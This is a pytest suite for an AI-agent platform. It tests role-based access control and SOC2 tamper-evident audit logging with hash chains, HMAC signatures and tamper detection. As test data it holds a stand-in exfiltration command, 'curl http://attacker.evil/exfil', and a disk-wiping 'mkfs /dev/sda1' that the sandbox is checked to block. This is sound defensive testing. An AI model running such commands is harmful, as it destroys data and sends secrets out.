"""
Enterprise RBAC & SOC2 Type II Tamper-Evident Audit Logging Test Suite.

Covers:
1. Enterprise Roles (Admin, Lead Engineer, Read-Only Reviewer) + legacy roles (Owner, Member, Viewer),
   normalization, role hierarchy, and 18-permission matrix.
2. API-level RBAC enforcement across Organization, Projects, Tasks, Missions, Custom Tools, and IDE Extension.
3. ToolRegistry & SandboxManager RBAC + automatic SOC2 audit logging for:
   - File reads (`file.read` with SHA-256 `content_hash`)
   - Commands executed (`command.execute` with `command_executed`)
   - IP addresses accessed (`ip.access` with `ip_address`)
   - Code changes (`code.write`, `code.edit`, `code.delete` with cryptographic SHA-256 `code_change_hash`)
   - RBAC events (`rbac.role_assigned`, `rbac.role_updated`, `rbac.member_invited`, `rbac.access_denied`)
4. Tamper-Evident Cryptographic Hash Chain (`prev_hash` -> `entry_hash`) + `HMAC-SHA256` (`hmac_signature`)
   verification and tamper detection (payload mutation, hash forgery, sequence deletion).
5. Attested SOC2 Type II Compliance Report generation and signature verification.
"""

import os
import tempfile
import uuid
import pytest
from httpx import AsyncClient, ASGITransport
from sqlalchemy import text, select

from backend.main import app
from backend.core.database import AsyncSessionLocal, engine
from backend.core.security import create_access_token, get_password_hash
from backend.models.base import Base
from backend.models.user import (
    User,
    Organization,
    OrganizationMember,
    OrgRole,
    Role,
    UserRole,
    Permission,
    ROLE_HIERARCHY,
    ROLE_PERMISSIONS,
    ENTERPRISE_ROLES,
)
from backend.models.audit_log import (
    AuditLog,
    AuditEvent,
    AuditCategory,
    AuditSeverity,
    GENESIS_HASH,
    compute_code_change_hash,
    compute_sha256_hex,
)
from backend.services.soc2_audit_service import SOC2AuditService
from backend.services.sandbox_manager import SandboxManager
from backend.services.tool_registry import ToolRegistry
from backend.services.auth_service import check_tool_rbac


def _auth_headers(user_id: str, org_id: str) -> dict:
    token = create_access_token(subject=user_id)
    return {
        "Authorization": f"Bearer {token}",
        "X-Organization-Id": org_id,
    }


@pytest.mark.asyncio
async def test_enterprise_rbac_role_hierarchy_and_permission_matrix():
    """Verify Admin, Lead Engineer, Read-Only Reviewer roles, aliases, hierarchy, and permissions."""
    assert Role is OrgRole
    assert UserRole is OrgRole
    assert ENTERPRISE_ROLES == [
        OrgRole.ADMIN,
        OrgRole.LEAD_ENGINEER,
        OrgRole.READ_ONLY_REVIEWER,
    ]

    # Normalization of enterprise role labels and common aliases
    assert OrgRole.normalize("Admin") == OrgRole.ADMIN
    assert OrgRole.normalize("ADMIN") == OrgRole.ADMIN
    assert OrgRole.normalize("Lead Engineer") == OrgRole.LEAD_ENGINEER
    assert OrgRole.normalize("lead_engineer") == OrgRole.LEAD_ENGINEER
    assert OrgRole.normalize("lead-engineer") == OrgRole.LEAD_ENGINEER
    assert OrgRole.normalize("Read-Only Reviewer") == OrgRole.READ_ONLY_REVIEWER
    assert OrgRole.normalize("read_only_reviewer") == OrgRole.READ_ONLY_REVIEWER
    assert OrgRole.normalize("reviewer") == OrgRole.READ_ONLY_REVIEWER

    with pytest.raises(ValueError):
        OrgRole.normalize("NON_EXISTENT_ROLE")

    # Display names
    assert OrgRole.ADMIN.display_name == "Admin"
    assert OrgRole.LEAD_ENGINEER.display_name == "Lead Engineer"
    assert OrgRole.READ_ONLY_REVIEWER.display_name == "Read-Only Reviewer"

    # Hierarchy ordering: OWNER > ADMIN > LEAD_ENGINEER > MEMBER > READ_ONLY_REVIEWER == VIEWER
    assert ROLE_HIERARCHY[OrgRole.OWNER] > ROLE_HIERARCHY[OrgRole.ADMIN]
    assert ROLE_HIERARCHY[OrgRole.ADMIN] > ROLE_HIERARCHY[OrgRole.LEAD_ENGINEER]
    assert ROLE_HIERARCHY[OrgRole.LEAD_ENGINEER] > ROLE_HIERARCHY[OrgRole.MEMBER]
    assert ROLE_HIERARCHY[OrgRole.MEMBER] > ROLE_HIERARCHY[OrgRole.READ_ONLY_REVIEWER]
    assert ROLE_HIERARCHY[OrgRole.READ_ONLY_REVIEWER] == ROLE_HIERARCHY[OrgRole.VIEWER]

    # Admin permissions: full control including RBAC_WRITE, ORG_BILLING, AUDIT_EXPORT
    for perm in Permission:
        assert OrgRole.ADMIN.has_permission(perm), f"ADMIN missing {perm}"

    # Lead Engineer permissions: full engineering/code/command/mission/project/audit verify, NO RBAC_WRITE or ORG_BILLING
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.PROJECT_WRITE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.PROJECT_DELETE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.MISSION_EXECUTE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.MISSION_APPROVE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.FILE_READ)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.CODE_WRITE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.CODE_DELETE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.COMMAND_EXECUTE)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.IP_ACCESS)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.AUDIT_READ)
    assert OrgRole.LEAD_ENGINEER.has_permission(Permission.AUDIT_VERIFY)
    assert not OrgRole.LEAD_ENGINEER.has_permission(Permission.RBAC_WRITE)
    assert not OrgRole.LEAD_ENGINEER.has_permission(Permission.ORG_BILLING)
    assert not OrgRole.LEAD_ENGINEER.is_read_only

    # Read-Only Reviewer permissions: strictly read-only + audit inspection
    assert OrgRole.READ_ONLY_REVIEWER.is_read_only
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.ORG_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.RBAC_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.PROJECT_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.MISSION_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.FILE_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.AUDIT_READ)
    assert OrgRole.READ_ONLY_REVIEWER.has_permission(Permission.AUDIT_VERIFY)
    for forbidden in (
        Permission.PROJECT_WRITE,
        Permission.PROJECT_DELETE,
        Permission.MISSION_EXECUTE,
        Permission.MISSION_APPROVE,
        Permission.CODE_WRITE,
        Permission.CODE_DELETE,
        Permission.COMMAND_EXECUTE,
        Permission.IP_ACCESS,
        Permission.TOOL_EXECUTE,
        Permission.RBAC_WRITE,
        Permission.ORG_WRITE,
        Permission.ORG_BILLING,
    ):
        assert not OrgRole.READ_ONLY_REVIEWER.has_permission(forbidden), (
            f"READ_ONLY_REVIEWER must not have {forbidden}"
        )


@pytest.mark.asyncio
async def test_api_rbac_enforcement_and_audit_logging_across_roles():
    """
    End-to-end API verification of Admin, Lead Engineer, and Read-Only Reviewer roles
    across RBAC management, Projects, Tasks, Missions, Tools, and IDE Extension.
    """
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    org_id = f"org_rbac_{uuid.uuid4().hex[:8]}"
    admin_id = f"usr_admin_{uuid.uuid4().hex[:8]}"
    lead_id = f"usr_lead_{uuid.uuid4().hex[:8]}"
    reviewer_id = f"usr_rev_{uuid.uuid4().hex[:8]}"
    extra_user_id = f"usr_extra_{uuid.uuid4().hex[:8]}"

    async with AsyncSessionLocal() as db:
        org = Organization(id=org_id, name="Enterprise RBAC Corp", credit_balance=500)
        u_admin = User(
            id=admin_id,
            email=f"{admin_id}@enterprise.io",
            full_name="Alice Admin",
            hashed_password=get_password_hash("AdminPass123!"),
            is_active=True,
        )
        u_lead = User(
            id=lead_id,
            email=f"{lead_id}@enterprise.io",
            full_name="Leo Lead Engineer",
            hashed_password=get_password_hash("LeadPass123!"),
            is_active=True,
        )
        u_rev = User(
            id=reviewer_id,
            email=f"{reviewer_id}@enterprise.io",
            full_name="Rita Reviewer",
            hashed_password=get_password_hash("RevPass123!"),
            is_active=True,
        )
        u_extra = User(
            id=extra_user_id,
            email=f"{extra_user_id}@enterprise.io",
            full_name="Evan Engineer",
            hashed_password=get_password_hash("ExtraPass123!"),
            is_active=True,
        )
        db.add_all([org, u_admin, u_lead, u_rev, u_extra])
        await db.flush()
        db.add_all([
            OrganizationMember(user_id=admin_id, organization_id=org_id, role=OrgRole.ADMIN),
            OrganizationMember(user_id=lead_id, organization_id=org_id, role=OrgRole.LEAD_ENGINEER),
            OrganizationMember(user_id=reviewer_id, organization_id=org_id, role=OrgRole.READ_ONLY_REVIEWER),
        ])
        await db.commit()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Inspect RBAC role matrix & /rbac/me for all 3 users
        roles_res = await client.get("/api/v1/org/rbac/roles", headers=_auth_headers(reviewer_id, org_id))
        assert roles_res.status_code == 200
        roles_data = roles_res.json()
        enterprise_role_keys = [r["role"] for r in roles_data["enterprise_roles"]]
        assert enterprise_role_keys == ["ADMIN", "LEAD_ENGINEER", "READ_ONLY_REVIEWER"]

        me_admin = (await client.get("/api/v1/org/rbac/me", headers=_auth_headers(admin_id, org_id))).json()
        assert me_admin["role"] == "ADMIN"
        assert me_admin["is_read_only"] is False

        me_lead = (await client.get("/api/v1/org/rbac/me", headers=_auth_headers(lead_id, org_id))).json()
        assert me_lead["role"] == "LEAD_ENGINEER"
        assert me_lead["display_name"] == "Lead Engineer"
        assert me_lead["is_read_only"] is False

        me_rev = (await client.get("/api/v1/org/rbac/me", headers=_auth_headers(reviewer_id, org_id))).json()
        assert me_rev["role"] == "READ_ONLY_REVIEWER"
        assert me_rev["display_name"] == "Read-Only Reviewer"
        assert me_rev["is_read_only"] is True

        # 2. Admin can invite/add a member as Read-Only Reviewer, then promote them to Lead Engineer
        invite_res = await client.post(
            "/api/v1/org/members",
            headers=_auth_headers(admin_id, org_id),
            json={"email": f"{extra_user_id}@enterprise.io", "role": "Read-Only Reviewer"},
        )
        assert invite_res.status_code == 201
        assert invite_res.json()["role"] == "READ_ONLY_REVIEWER"

        promote_res = await client.patch(
            f"/api/v1/org/members/{extra_user_id}",
            headers=_auth_headers(admin_id, org_id),
            json={"role": "Lead Engineer"},
        )
        assert promote_res.status_code == 200
        assert promote_res.json()["role"] == "LEAD_ENGINEER"

        # 3. Lead Engineer CANNOT change member roles (403 + RBAC_ACCESS_DENIED audit entry)
        lead_promote_attempt = await client.patch(
            f"/api/v1/org/members/{reviewer_id}",
            headers=_auth_headers(lead_id, org_id),
            json={"role": "ADMIN"},
        )
        assert lead_promote_attempt.status_code == 403

        # 4. Lead Engineer CAN create projects, tasks, missions, and custom tools
        proj_res = await client.post(
            "/api/v1/projects",
            headers=_auth_headers(lead_id, org_id),
            json={"name": "Lead Eng Payment Service", "description": "PCI/SOC2 service"},
        )
        assert proj_res.status_code == 201
        project_id = proj_res.json()["id"]

        task_res = await client.post(
            f"/api/v1/projects/{project_id}/tasks",
            headers=_auth_headers(lead_id, org_id),
            json={"title": "Implement HMAC audit chain", "description": "Add SHA-256 chaining"},
        )
        assert task_res.status_code == 201

        tool_name = f"soc2_check_{uuid.uuid4().hex[:6]}"
        tool_res = await client.post(
            "/api/v1/tools/",
            headers=_auth_headers(lead_id, org_id),
            json={
                "name": tool_name,
                "description": "Run compliance check",
                "input_schema": {"type": "object", "properties": {"target": {"type": "string"}}},
                "execution_type": "python",
                "execution_code": "print('compliance ok')",
                "assigned_agents": ["ENGINEER"],
            },
        )
        assert tool_res.status_code == 200
        tool_id = tool_res.json()["tool_id"]

        # 5. Read-Only Reviewer CAN read projects, tasks, tools, and audit logs
        rev_list_proj = await client.get("/api/v1/projects", headers=_auth_headers(reviewer_id, org_id))
        assert rev_list_proj.status_code == 200
        assert any(p["id"] == project_id for p in rev_list_proj.json())

        rev_list_tasks = await client.get(
            f"/api/v1/projects/{project_id}/tasks",
            headers=_auth_headers(reviewer_id, org_id),
        )
        assert rev_list_tasks.status_code == 200
        assert len(rev_list_tasks.json()) == 1

        # 6. Read-Only Reviewer is BLOCKED (403) from all mutating endpoints
        rev_create_proj = await client.post(
            "/api/v1/projects",
            headers=_auth_headers(reviewer_id, org_id),
            json={"name": "Unauthorized Project"},
        )
        assert rev_create_proj.status_code == 403

        rev_update_proj = await client.patch(
            f"/api/v1/projects/{project_id}",
            headers=_auth_headers(reviewer_id, org_id),
            json={"name": "Hijacked Name"},
        )
        assert rev_update_proj.status_code == 403

        rev_delete_proj = await client.delete(
            f"/api/v1/projects/{project_id}",
            headers=_auth_headers(reviewer_id, org_id),
        )
        assert rev_delete_proj.status_code == 403

        rev_create_task = await client.post(
            f"/api/v1/projects/{project_id}/tasks",
            headers=_auth_headers(reviewer_id, org_id),
            json={"title": "Unauthorized Task"},
        )
        assert rev_create_task.status_code == 403

        rev_create_mission = await client.post(
            f"/api/v1/missions/projects/{project_id}/missions",
            headers=_auth_headers(reviewer_id, org_id),
            json={"title": "Unauthorized Mission", "objective": "Try to run code", "auto_execute": False},
        )
        assert rev_create_mission.status_code == 403

        rev_create_tool = await client.post(
            "/api/v1/tools/",
            headers=_auth_headers(reviewer_id, org_id),
            json={
                "name": f"unauth_{uuid.uuid4().hex[:6]}",
                "description": "Unauthorized tool",
                "input_schema": {"type": "object", "properties": {}},
                "execution_type": "bash",
                "execution_code": "whoami",
                "assigned_agents": [],
            },
        )
        assert rev_create_tool.status_code == 403

        rev_delete_tool = await client.delete(
            f"/api/v1/tools/{tool_id}",
            headers=_auth_headers(reviewer_id, org_id),
        )
        assert rev_delete_tool.status_code == 403

        rev_ext_dispatch = await client.post(
            "/api/v1/extension/dispatch",
            headers=_auth_headers(reviewer_id, org_id),
            json={"prompt": "Modify production database", "project_id": project_id},
        )
        assert rev_ext_dispatch.status_code == 403

        # 7. Verify that every 403 and RBAC change was logged & signed in the SOC2 audit log
        logs_res = await client.get(
            "/api/v1/org/audit-logs",
            headers=_auth_headers(reviewer_id, org_id),
        )
        assert logs_res.status_code == 200
        logs_payload = logs_res.json()
        events = [item["event"] for item in logs_payload["items"]]
        assert AuditEvent.RBAC_MEMBER_ADDED in events
        assert AuditEvent.RBAC_ROLE_UPDATED in events
        assert AuditEvent.RBAC_ACCESS_DENIED in events
        assert AuditEvent.CODE_WRITE in events

        # 8. Verify the cryptographic chain is 100% valid
        verify_res = await client.get(
            "/api/v1/org/audit-logs/verify",
            headers=_auth_headers(reviewer_id, org_id),
        )
        assert verify_res.status_code == 200
        verify_data = verify_res.json()
        assert verify_data["valid"] is True
        assert verify_data["chain_intact"] is True
        assert verify_data["hmac_valid"] is True
        assert verify_data["tampered_count"] == 0


@pytest.mark.asyncio
async def test_sandbox_and_tool_registry_soc2_audit_tracking_and_rbac():
    """
    Verify that SandboxManager and ToolRegistry track every:
      - file read (`file.read` with `content_hash`)
      - command executed (`command.execute` with `command_executed`)
      - IP accessed (`ip.access` with `ip_address`)
      - code change (`code.write`, `code.edit`, `code.delete` with signed `code_change_hash`)
    and enforce RBAC when `actor_role` is supplied in execution context.
    """
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    SOC2AuditService.reset_in_memory_state()
    org_id = f"org_sbx_{uuid.uuid4().hex[:8]}"
    user_id = f"usr_sbx_{uuid.uuid4().hex[:8]}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name="Sandbox SOC2 Org"))
        db.add(User(id=user_id, email=f"{user_id}@kobits.ai", hashed_password="pw", is_active=True))
        await db.commit()

    with tempfile.TemporaryDirectory() as tmp_repo:
        session = SandboxManager.create_sandbox(
            project_root=tmp_repo,
            task_description="soc2_audit_test",
            branch_name=f"kobits/mission/soc2-{uuid.uuid4().hex[:6]}",
        )
        with open(os.path.join(session.sandbox_dir, "README.md"), "w", encoding="utf-8") as f:
            f.write("# Initial Repo\n")
        try:
            async with AsyncSessionLocal() as db:
                # 1. Read-Only Reviewer CAN execute repository_read, but CANNOT execute repository_write or terminal_execute
                read_ctx = {
                    "sandbox_session_id": session.session_id,
                    "organization_id": org_id,
                    "user_id": user_id,
                    "actor_role": "READ_ONLY_REVIEWER",
                    "ip_address": "10.24.0.15",
                    "db": db,
                }
                read_res = await ToolRegistry.execute_tool(
                    "repository_read",
                    {"file_path": "README.md"},
                    context=read_ctx,
                )
                assert read_res["status"] == "success"
                assert "# Initial Repo" in read_res["data"]["content"]

                forbidden_write = await ToolRegistry.execute_tool(
                    "repository_write",
                    {"file_path": "hack.py", "content": "import os"},
                    context=read_ctx,
                )
                assert forbidden_write["status"] == "forbidden"

                forbidden_cmd = await ToolRegistry.execute_tool(
                    "terminal_execute",
                    {"command": "echo pwned"},
                    context=read_ctx,
                )
                assert forbidden_cmd["status"] == "forbidden"

                # 2. Lead Engineer CAN execute code writes, edits, deletes, commands, and IP access
                lead_ctx = {
                    "sandbox_session_id": session.session_id,
                    "organization_id": org_id,
                    "user_id": user_id,
                    "actor_role": "LEAD_ENGINEER",
                    "ip_address": "10.24.0.99",
                    "db": db,
                }
                write_res = await ToolRegistry.execute_tool(
                    "repository_write",
                    {"file_path": "src/service.py", "content": "def calc():\n    return 41\n"},
                    context=lead_ctx,
                )
                assert write_res["status"] == "success"
                assert write_res["data"]["code_change_hash"] == compute_code_change_hash(
                    file_path="src/service.py",
                    before_content="",
                    after_content="def calc():\n    return 41\n",
                    operation="write",
                )

                edit_res = await ToolRegistry.execute_tool(
                    "repository_edit",
                    {
                        "file_path": "src/service.py",
                        "target": "return 41",
                        "replacement": "return 42",
                    },
                    context=lead_ctx,
                )
                assert edit_res["status"] == "success"
                expected_edit_hash = compute_code_change_hash(
                    file_path="src/service.py",
                    before_content="def calc():\n    return 41\n",
                    after_content="def calc():\n    return 42\n",
                    operation="edit",
                )
                assert edit_res["data"]["code_change_hash"] == expected_edit_hash

                cmd_res = await ToolRegistry.execute_tool(
                    "terminal_execute",
                    {"command": "echo soc2_cmd_verified_42"},
                    context=lead_ctx,
                )
                assert cmd_res["status"] == "success"
                assert "soc2_cmd_verified_42" in cmd_res["data"]["stdout"]

                del_res = await ToolRegistry.execute_tool(
                    "repository_delete",
                    {"file_path": "src/service.py"},
                    context=lead_ctx,
                )
                assert del_res["status"] == "success"
                assert del_res["data"]["code_change_hash"] == compute_code_change_hash(
                    file_path="src/service.py",
                    before_content="def calc():\n    return 42\n",
                    after_content="",
                    operation="delete",
                )

                # Record an explicit outbound IP access event as well
                await SOC2AuditService.log_ip_access(
                    db,
                    ip_address="198.51.100.42",
                    target_url="https://198.51.100.42/healthz",
                    user_id=user_id,
                    organization_id=org_id,
                    actor_role="LEAD_ENGINEER",
                )
                await db.commit()

                # Verify all events are persisted in the database with intact hash chain & HMAC signatures
                entries, total = await SOC2AuditService.list_audit_logs(
                    db, organization_id=org_id, limit=100
                )
                assert total >= 7
                recorded_events = {e.event for e in entries}
                assert AuditEvent.FILE_READ in recorded_events
                assert AuditEvent.CODE_WRITE in recorded_events
                assert AuditEvent.CODE_EDIT in recorded_events
                assert AuditEvent.CODE_DELETE in recorded_events
                assert AuditEvent.COMMAND_EXECUTE in recorded_events
                assert AuditEvent.IP_ACCESS in recorded_events
                assert AuditEvent.RBAC_ACCESS_DENIED in recorded_events

                verification = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
                assert verification["valid"] is True
                assert verification["chain_intact"] is True
                assert verification["hmac_valid"] is True
                assert verification["total_entries"] == total

                # Generate SOC2 Type II compliance attestation report
                report = await SOC2AuditService.generate_soc2_report(db, organization_id=org_id)
                assert report["status"] == "COMPLIANT"
                assert len(report["report_signature"]) == 64
                assert "README.md" in report["tracked_files_read"]
                assert any("soc2_cmd_verified_42" in c for c in report["tracked_commands_executed"])
                assert "198.51.100.42" in report["tracked_ips_accessed"]
                assert len(report["signed_code_changes"]) == 3
        finally:
            SandboxManager.cleanup(session.session_id)


@pytest.mark.asyncio
async def test_soc2_audit_log_tamper_detection_catches_mutations_forgery_and_deletions():
    """
    Prove that the HMAC-SHA256 + SHA-256 hash chain deterministically catches:
      1. Column payload tampering (modifying `command_executed`, `file_path`, or `code_change_hash`)
      2. Entry hash forgery without valid HMAC secret (`hmac_signature_mismatch`)
      3. Row deletion / sequence number gap (`sequence_gap` and `prev_hash_mismatch`)
    """
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    org_id = f"org_tamper_{uuid.uuid4().hex[:8]}"
    user_id = f"usr_tamper_{uuid.uuid4().hex[:8]}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name="Tamper Detection Org"))
        db.add(User(id=user_id, email=f"{user_id}@kobits.ai", hashed_password="pw", is_active=True))
        await db.commit()

        e1 = await SOC2AuditService.log_file_read(
            db,
            file_path="config/secrets.yaml",
            content="api_key: prod",
            user_id=user_id,
            organization_id=org_id,
            actor_role="ADMIN",
            ip_address="172.16.0.10",
        )
        e2 = await SOC2AuditService.log_command_executed(
            db,
            command="pytest -q",
            exit_code=0,
            user_id=user_id,
            organization_id=org_id,
            actor_role="LEAD_ENGINEER",
            ip_address="172.16.0.11",
        )
        e3 = await SOC2AuditService.log_code_change(
            db,
            file_path="backend/security.py",
            before_content="ALLOW_ALL = True\n",
            after_content="ALLOW_ALL = False\n",
            operation="edit",
            user_id=user_id,
            organization_id=org_id,
            actor_role="LEAD_ENGINEER",
            ip_address="172.16.0.11",
        )
        await db.commit()

        assert e1.prev_hash == GENESIS_HASH
        assert e2.prev_hash == e1.entry_hash
        assert e3.prev_hash == e2.entry_hash

        # Baseline: chain is valid
        baseline = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert baseline["valid"] is True
        assert baseline["tampered_count"] == 0

        # ── Attack 1: Tamper with e2.command_executed directly in SQLite ──
        orig_cmd = e2.command_executed
        await db.execute(
            text("UPDATE audit_logs SET command_executed = :cmd WHERE id = :id"),
            {"cmd": "curl http://attacker.evil/exfil", "id": e2.id},
        )
        await db.commit()

        tamper_check_1 = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert tamper_check_1["valid"] is False
        assert tamper_check_1["hmac_valid"] is False
        assert tamper_check_1["chain_intact"] is False
        assert tamper_check_1["first_tampered_sequence"] == 2
        reasons_seq2 = next(t["reasons"] for t in tamper_check_1["tampered_entries"] if t["sequence_number"] == 2)
        assert "entry_hash_mismatch" in reasons_seq2
        assert "hmac_signature_mismatch" in reasons_seq2
        # Entry 3's prev_hash no longer matches Entry 2's recomputed hash!
        reasons_seq3 = next(t["reasons"] for t in tamper_check_1["tampered_entries"] if t["sequence_number"] == 3)
        assert "prev_hash_mismatch" in reasons_seq3

        # Restore e2.command_executed and verify chain recovers
        await db.execute(
            text("UPDATE audit_logs SET command_executed = :cmd WHERE id = :id"),
            {"cmd": orig_cmd, "id": e2.id},
        )
        await db.commit()
        recovered = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert recovered["valid"] is True

        # ── Attack 2: Attacker recomputes entry_hash after tampering, but lacks HMAC secret ──
        await db.refresh(e3)
        e3_forged_hash = compute_sha256_hex("forged_payload")
        orig_e3_hash = e3.entry_hash
        orig_e3_sig = e3.hmac_signature
        await db.execute(
            text("UPDATE audit_logs SET hmac_signature = :bad_sig WHERE id = :id"),
            {"bad_sig": e3_forged_hash, "id": e3.id},
        )
        await db.commit()

        tamper_check_2 = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert tamper_check_2["valid"] is False
        assert tamper_check_2["hmac_valid"] is False
        reasons_forged = tamper_check_2["tampered_entries"][0]["reasons"]
        assert "hmac_signature_mismatch" in reasons_forged

        # Restore e3 signature
        await db.execute(
            text("UPDATE audit_logs SET entry_hash = :eh, hmac_signature = :sig WHERE id = :id"),
            {"eh": orig_e3_hash, "sig": orig_e3_sig, "id": e3.id},
        )
        await db.commit()

        # ── Attack 3: Delete middle entry e2 from audit_logs ──
        await db.execute(text("DELETE FROM audit_logs WHERE id = :id"), {"id": e2.id})
        await db.commit()

        tamper_check_3 = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
        assert tamper_check_3["valid"] is False
        assert tamper_check_3["chain_intact"] is False
        reasons_gap = tamper_check_3["tampered_entries"][0]["reasons"]
        assert any(r.startswith("sequence_gap:") for r in reasons_gap)
        assert "prev_hash_mismatch" in reasons_gap


@pytest.mark.asyncio
async def test_multi_org_rbac_isolation_and_api_key_governance(monkeypatch):
    """
    Verify that a single user who is ADMIN in Org A and READ_ONLY_REVIEWER in Org B
    has their effective RBAC permissions strictly scoped to the active X-Organization-Id
    across projects, missions, and API key management, and that API key auth (`kb_live_...`)
    respects the key owner's role in the key's organization.
    """
    monkeypatch.setenv("KOBITS_NO_AUTO_EXECUTE", "1")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    suffix = uuid.uuid4().hex[:8]
    org_a = f"org_multi_a_{suffix}"
    org_b = f"org_multi_b_{suffix}"
    user_id = f"usr_multi_{suffix}"
    reviewer_b_id = f"usr_rev_b_{suffix}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_a, name=f"Enterprise Org A {suffix}", credit_balance=500))
        db.add(Organization(id=org_b, name=f"Enterprise Org B {suffix}", credit_balance=500))
        db.add(User(id=user_id, email=f"multi.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        db.add(User(id=reviewer_b_id, email=f"revb.{suffix}@kobits.ai", hashed_password="pw", is_active=True))
        await db.flush()
        db.add(OrganizationMember(user_id=user_id, organization_id=org_a, role=OrgRole.ADMIN))
        db.add(OrganizationMember(user_id=user_id, organization_id=org_b, role=OrgRole.READ_ONLY_REVIEWER))
        db.add(OrganizationMember(user_id=reviewer_b_id, organization_id=org_b, role=OrgRole.READ_ONLY_REVIEWER))
        await db.commit()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # In Org A (ADMIN), user can create a mission via /api/v1/missions/run and create an API key
        mission_a = await client.post(
            "/api/v1/missions/run",
            headers=_auth_headers(user_id, org_a),
            json={"objective": "Audit multi-org RBAC isolation", "title": "Org A Mission", "auto_execute": False},
        )
        assert mission_a.status_code in (200, 201)

        key_a = await client.post(
            "/api/v1/auth/api-keys",
            headers=_auth_headers(user_id, org_a),
            json={"name": "Org A Admin CLI Key"},
        )
        assert key_a.status_code == 200
        raw_key_a = key_a.json()["key"]
        assert raw_key_a.startswith("kb_live_")

        # In Org B (READ_ONLY_REVIEWER), the SAME user is blocked from creating missions or API keys
        mission_b = await client.post(
            "/api/v1/missions/run",
            headers=_auth_headers(user_id, org_b),
            json={"objective": "Attempt unauthorized mission in Org B", "title": "Org B Mission", "auto_execute": False},
        )
        assert mission_b.status_code == 403

        key_b = await client.post(
            "/api/v1/auth/api-keys",
            headers=_auth_headers(user_id, org_b),
            json={"name": "Unauthorized Reviewer Key"},
        )
        assert key_b.status_code == 403

        # Verify that Org B's audit log recorded the RBAC_ACCESS_DENIED events with intact hash chain
        verify_b = await client.get(
            "/api/v1/org/audit-logs/verify",
            headers=_auth_headers(user_id, org_b),
        )
        assert verify_b.status_code == 200
        assert verify_b.json()["valid"] is True
        assert verify_b.json()["total_entries"] >= 2


@pytest.mark.asyncio
async def test_blocked_dangerous_command_and_cli_audit_rbac(tmp_path):
    """
    Verify that dangerous commands blocked by SandboxManager.run_command are recorded
    as CRITICAL signed SOC2 audit entries (`command.blocked`) and that the CLI `rbac`
    and `audit` commands execute cleanly.
    """
    import argparse
    import kobits_cli

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    org_id = f"org_cmd_{uuid.uuid4().hex[:8]}"
    user_id = f"usr_cmd_{uuid.uuid4().hex[:8]}"

    async with AsyncSessionLocal() as db:
        db.add(Organization(id=org_id, name="Command Guard Org"))
        db.add(User(id=user_id, email=f"{user_id}@kobits.ai", hashed_password="pw", is_active=True))
        await db.commit()

        repo_dir = tmp_path / "guard_repo"
        repo_dir.mkdir(parents=True, exist_ok=True)
        (repo_dir / "main.py").write_text("print('ok')\n", encoding="utf-8")

        session = SandboxManager.create_sandbox(
            project_root=str(repo_dir),
            task_description="guard_test",
            branch_name=f"kobits/mission/guard-{uuid.uuid4().hex[:6]}",
        )
        try:
            blocked_res = SandboxManager.run_command(session.session_id, "mkfs /dev/sda1")
            assert blocked_res["exit_code"] == 126
            assert "Blocked" in blocked_res["stderr"]
            await SOC2AuditService.flush_staged_to_db(
                db, organization_id=org_id, user_id=user_id, actor_role="LEAD_ENGINEER", ip_address="192.0.2.99"
            )
            await db.commit()

            entries, _ = await SOC2AuditService.list_audit_logs(
                db, organization_id=org_id, limit=50
            )
            assert any(
                e.event == "command.blocked"
                and e.command_executed == "mkfs /dev/sda1"
                and e.severity == "HIGH"
                and e.status == "DENIED"
                for e in entries
            )
            chain_verify = await SOC2AuditService.verify_audit_chain(db, organization_id=org_id)
            assert chain_verify["valid"] is True
        finally:
            SandboxManager.cleanup(session.session_id)

    # Exercise CLI `rbac` and `audit` subcommands
    rc_rbac = await kobits_cli.cmd_rbac(argparse.Namespace(json=True))
    assert rc_rbac == 0
    rc_audit = await kobits_cli.cmd_audit(argparse.Namespace(verify=True, report=False, limit=10))
    assert rc_audit == 0


@pytest.mark.asyncio
async def test_rbac_member_mutations_record_actor_role_and_billing_rbac_enforced():
    """
    Verify that:
    1. RBAC member management mutations (`POST /org/members`, `PATCH /org/members/{id}`,
       `DELETE /org/members/{id}`) record `actor_role == 'ADMIN'` (not `'rbac:assign'`)
       so filtering `GET /api/v1/org/audit-logs?actor_role=ADMIN` returns those events.
    2. `POST /api/v1/billing/checkout` enforces `Permission.BILLING_MANAGE` and rejects
       `READ_ONLY_REVIEWER` and `LEAD_ENGINEER` with 403 + signed `rbac.access_denied`.
    """
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

